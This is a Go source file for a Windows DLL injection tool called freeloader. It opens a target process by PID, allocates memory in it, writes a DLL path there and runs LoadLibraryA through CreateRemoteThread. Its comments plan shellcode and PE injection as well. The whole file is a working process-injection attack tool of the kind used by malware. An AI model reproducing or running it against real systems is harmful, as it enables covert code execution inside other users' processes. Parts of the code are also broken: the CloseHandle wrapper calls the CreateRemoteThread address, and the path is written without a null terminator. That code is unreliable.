package main

/*  @saulpanders
*	freeloader.go: General purpose DLL, PE & Shellcode injection
*	inspired by syringe: https://github.com/securestate/syringe
*	using https://github.com/golang/go/wiki/WindowsDLLs for pinvoke help

	implement dll injection (local & remote process) - use reflection?
	implement shellcode injection (local & remote process)
	implement pe injection (remote process)

	Working remote DLL injection 12/19/21
*/

import (
	"flag"
	"fmt"
	"syscall"
	"unsafe"
)

func abort(funcname string, err error) {
	panic(fmt.Sprintf("%s failed: %v", funcname, err))
}

var (
	kernel32, _        = syscall.LoadLibrary("kernel32.dll")
	getModuleHandle, _ = syscall.GetProcAddress(kernel32, "GetModuleHandleW")

	openProcess, _    = syscall.GetProcAddress(kernel32, "OpenProcess")
	getProcAddress, _ = syscall.GetProcAddress(kernel32, "GetProcAddress")
	loadLibraryA, _   = syscall.GetProcAddress(kernel32, "LoadLibraryA")

	virtualAlloc, _       = syscall.GetProcAddress(kernel32, "VirtualAlloc")
	virtualAllocEx, _     = syscall.GetProcAddress(kernel32, "VirtualAllocEx")
	writeProcessMemory, _ = syscall.GetProcAddress(kernel32, "WriteProcessMemory")

	createRemoteThreadEx, _ = syscall.GetProcAddress(kernel32, "CreateRemoteThread")
	//createThread, _       = syscall.GetProcAddress(kernel32, "CreateThread")

	closeHandle, _ = syscall.GetProcAddress(kernel32, "CloseHandle")

	/*
		WaitForSingleObject
		VirtualFree


	*/
)

const (
	PROCESS_CREATE_THREAD     = 0x0080
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_VM_READ           = 0x0010
	PROCESS_VM_WRITE          = 0x0020

	CREATE_THREAD_ACCESS = (PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)

	MEM_COMMIT  = 0x00001000
	MEM_RESERVE = 0x00002000

	MEM_PERMISSIONS = (MEM_COMMIT | MEM_RESERVE)

	PAGE_READWRITE = 0x04
)

//"Pinvoke" definitions

func GetModuleHandle() (handle uintptr) {
	var nargs uintptr = 0
	if ret, _, callErr := syscall.Syscall(uintptr(getModuleHandle), nargs, 0, 0, 0); callErr != 0 {
		abort("Call GetModuleHandle", callErr)
	} else {
		handle = ret
	}
	return
}

//function syscall wrapping
//openprocess
func OpenProcess(access uintptr, inhereth uintptr, pid uintptr) (handle uintptr) {
	var nargs uintptr = 3
	if ret, _, callErr := syscall.Syscall(uintptr(openProcess), nargs, access, inhereth, pid); callErr != 0 {
		abort("Call OpenProcess", callErr)
	} else {
		handle = ret
	}
	return
}

//virtualAllocEx
func VirtualAllocEx(hProc uintptr, lpAddress uintptr, size int, flAllocationType int, flProtect int, extra uintptr) (address uintptr) {
	var nargs uintptr = 5
	if ret, _, callErr := syscall.Syscall6(uintptr(virtualAllocEx), nargs, uintptr(hProc), uintptr(lpAddress), uintptr(size), uintptr(flAllocationType), uintptr(flProtect), extra); callErr != 0 {
		abort("Call VirtualAllocEx", callErr)
	} else {
		address = ret
	}
	return
}

//WriteProcessMemory
func WriteProcessMemory(hProc uintptr, lpBaseAddress uintptr, lpBuffer uintptr, size int, lpNumBytesWrote int, extra uintptr) (success uintptr) {
	var nargs uintptr = 5
	if ret, _, callErr := syscall.Syscall6(uintptr(writeProcessMemory), nargs, uintptr(hProc), uintptr(lpBaseAddress), uintptr(lpBuffer), uintptr(size), uintptr(lpNumBytesWrote), extra); callErr != 0 {
		abort("Call WriteProcessMemory", callErr)
	} else {
		success = ret
	}
	return
}

//CreateRemoteThread
func CreateRemoteThreadEx(hProc uintptr, lpSecurityAttributes uintptr, size int, lpStartAddress uintptr, lpParameter uintptr, flags int) (handle uintptr) {
	var nargs uintptr = 6
	if ret, _, callErr := syscall.Syscall6(uintptr(createRemoteThreadEx), nargs, hProc, lpSecurityAttributes, uintptr(size), lpStartAddress, lpParameter, uintptr(flags)); callErr != 0 {
		abort("Call CreateRemoteThreadEx", callErr)
	} else {
		handle = ret
	}
	return
}

func CloseHandle(handle uintptr, extra1 uintptr, extra2 uintptr) (success uintptr) {
	var nargs uintptr = 1
	if ret, _, callErr := syscall.Syscall(uintptr(createRemoteThreadEx), nargs, handle, extra1, extra2); callErr != 0 {
		abort("Call CloseHandle", callErr)
	} else {
		success = ret
	}
	return
}

// INJECTORS: core logic

func InjectDLL(pDll string, dwProcessID uintptr) {

	var hProc uintptr
	//var hRemoteThread uintptr
	var pRemoteBuff uintptr
	//var pLoadLibraryAddr uintptr

	db := []byte(pDll)
	//get handle to target proc

	hProc = OpenProcess(CREATE_THREAD_ACCESS, 0, dwProcessID)

	//allocate space in target
	pRemoteBuff = VirtualAllocEx(hProc, 0, len(pDll), MEM_PERMISSIONS, PAGE_READWRITE, 0)

	//write DLL to allocated memory
	_ = WriteProcessMemory(hProc, pRemoteBuff, uintptr(unsafe.Pointer(&db[0])), len(pDll), 0, 0)

	//execute with createremotethreadex
	_ = CreateRemoteThreadEx(hProc, 0, 0, loadLibraryA, pRemoteBuff, 0)

	//close handle to target proc
	_ = CloseHandle(hProc, 0, 0)

}

//main etc.
func main() {
	defer syscall.FreeLibrary(kernel32)

	dll := flag.String("dll", "test", "path to dll for injection")
	pid := flag.Int("pid", 0, "Process ID to inject into")
	flag.Parse()

	InjectDLL(*dll, (uintptr)(*pid))

}
